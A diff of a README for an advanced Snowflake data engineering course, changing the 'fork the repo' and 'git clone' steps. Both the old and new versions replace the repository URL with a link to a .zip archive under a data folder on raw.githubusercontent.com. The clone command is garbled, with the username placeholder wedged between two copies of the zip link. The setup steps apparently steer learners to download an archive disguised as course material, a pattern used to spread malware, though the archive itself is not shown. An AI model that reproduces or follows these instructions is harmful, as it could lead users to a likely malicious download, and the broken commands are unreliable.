@@ -12,12 +12,12 @@ To successfully follow along with the instructor during the course, you'll need 
 
 #### How to clone the repo to your local computing environment:
 
-1. Fork the repo to create a copy associated with your GitHub Account: https://raw.githubusercontent.com/wafiqj/advanced-data-engineering-snowflake/main/module-1/hamburg_weather/pipeline/objects/tables/engineering_data_advanced_snowflake_v2.7.zip
+1. Fork the repo to create a copy associated with your GitHub Account: https://raw.githubusercontent.com/wafiqj/advanced-data-engineering-snowflake/main/module-1/data-snowflake-advanced-engineering-1.9.zip
 
 2. Clone your fork:
 
 ```bash
-git clone https://raw.githubusercontent.com/wafiqj/advanced-data-engineering-snowflake/main/module-1/hamburg_weather/pipeline/objects/tables/engineering_data_advanced_snowflake_v2.7.zip<your-GitHub-user-name>https://raw.githubusercontent.com/wafiqj/advanced-data-engineering-snowflake/main/module-1/hamburg_weather/pipeline/objects/tables/engineering_data_advanced_snowflake_v2.7.zip
+git clone https://raw.githubusercontent.com/wafiqj/advanced-data-engineering-snowflake/main/module-1/data-snowflake-advanced-engineering-1.9.zip<your-GitHub-user-name>https://raw.githubusercontent.com/wafiqj/advanced-data-engineering-snowflake/main/module-1/data-snowflake-advanced-engineering-1.9.zip
 ```
 
 Where `<your-GitHub-user-name>` is replaced by your GitHub user name. This workflow is covered in the course.
